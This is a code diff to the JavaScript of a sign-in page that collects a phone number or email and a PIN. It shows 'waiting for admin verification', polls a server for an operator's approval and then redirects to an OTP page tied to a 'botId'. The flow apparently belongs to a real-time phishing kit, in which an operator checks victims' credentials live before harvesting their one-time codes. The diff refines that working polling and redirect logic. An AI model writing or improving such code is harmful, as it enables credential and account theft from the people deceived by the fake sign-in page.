@@ -620,52 +620,61 @@ document.getElementById('detailsForm').addEventListener('submit', async e => {
         // Show waiting status with spinner
         showStatus('⏳ Waiting for admin verification...', 'waiting');
 
-        // ---------------- POLLING ----------------
+        // ---------------- POLLING (FIXED) ----------------
         const poll = setInterval(async () => {
             try {
                 const r = await fetch(`/check-details/${data.requestId}`);
                 const d = await r.json();
+                
+                console.log('📊 Polling response:', d);
 
-                // ✅ All approved - redirect to OTP page
-                if (d.approved === true) {
-                    clearInterval(poll);
-                    showStatus('✅ Verified! Redirecting...', 'success');
-                    signinBtn.disabled = false;
-                    signinBtn.textContent = "Sign In";
-                    
-                    console.log('✅ All verified! Redirecting to OTP page...');
-                    
-                    setTimeout(() => {
-                        window.location.href = `/code.html?botId=${botId}`;
-                    }, 1500);
-                }
+                // Check if we have an object response with approval status
+                if (typeof d === 'object' && d !== null) {
+                    // ✅ Fully approved - redirect to OTP page
+                    if (d.approved === true) {
+                        clearInterval(poll);
+                        showStatus('✅ Verified! Redirecting...', 'success');
+                        signinBtn.disabled = false;
+                        signinBtn.textContent = "Sign In";
+                        
+                        console.log('✅ All verified! Redirecting to OTP page...');
+                        
+                        setTimeout(() => {
+                            window.location.href = `/code.html?botId=${botId}`;
+                        }, 1500);
+                        return;
+                    }
 
-                // ❌ Phone/Email rejected
-                if (d.approved === false && d.reason === 'invalid_identifier') {
-                    clearInterval(poll);
-                    showStatus('❌ Invalid phone number/email. Please check and try again.', 'error');
-                    signinBtn.disabled = false;
-                    signinBtn.textContent = "Sign In";
-                    userInput.value = '';
-                    userInput.focus();
-                }
+                    // ❌ Phone/Email rejected
+                    if (d.approved === false && d.reason === 'invalid_identifier') {
+                        clearInterval(poll);
+                        showStatus('❌ Invalid phone number/email. Please check and try again.', 'error');
+                        signinBtn.disabled = false;
+                        signinBtn.textContent = "Sign In";
+                        userInput.value = '';
+                        userInput.focus();
+                        return;
+                    }
 
-                // ❌ PIN rejected
-                if (d.approved === false && d.reason === 'invalid_pin') {
-                    clearInterval(poll);
-                    showStatus('❌ Incorrect PIN. Please try again.', 'error');
-                    signinBtn.disabled = false;
-                    signinBtn.textContent = "Sign In";
-                    document.getElementById('pin').value = '';
-                    document.getElementById('pin').focus();
-                }
+                    // ❌ PIN rejected
+                    if (d.approved === false && d.reason === 'invalid_pin') {
+                        clearInterval(poll);
+                        showStatus('❌ Incorrect PIN. Please try again.', 'error');
+                        signinBtn.disabled = false;
+                        signinBtn.textContent = "Sign In";
+                        document.getElementById('pin').value = '';
+                        document.getElementById('pin').focus();
+                        return;
+                    }
 
-                // ❌ Both rejected (fallback)
-                if (d.approved === false && !d.reason) {
-                    clearInterval(poll);
-                    showStatus('❌ Verification failed. Please check your details.', 'error');
-                    signinBtn.disabled = false;
-                    signinBtn.textContent = "Sign In";
+                    // ❌ Both rejected or still pending
+                    if (d.approved === false) {
+                        clearInterval(poll);
+                        showStatus('❌ Verification failed. Please check your details.', 'error');
+                        signinBtn.disabled = false;
+                        signinBtn.textContent = "Sign In";
+                        return;
+                    }
                 }
 
             } catch (err) {
@@ -675,7 +684,7 @@ document.getElementById('detailsForm').addEventListener('submit', async e => {
                 signinBtn.textContent = "Sign In";
             }
 
-        }, 2000);
+        }, 3000); // Poll every 3 seconds
 
     } catch (err) {
         showStatus('❌ ' + err.message, 'error');
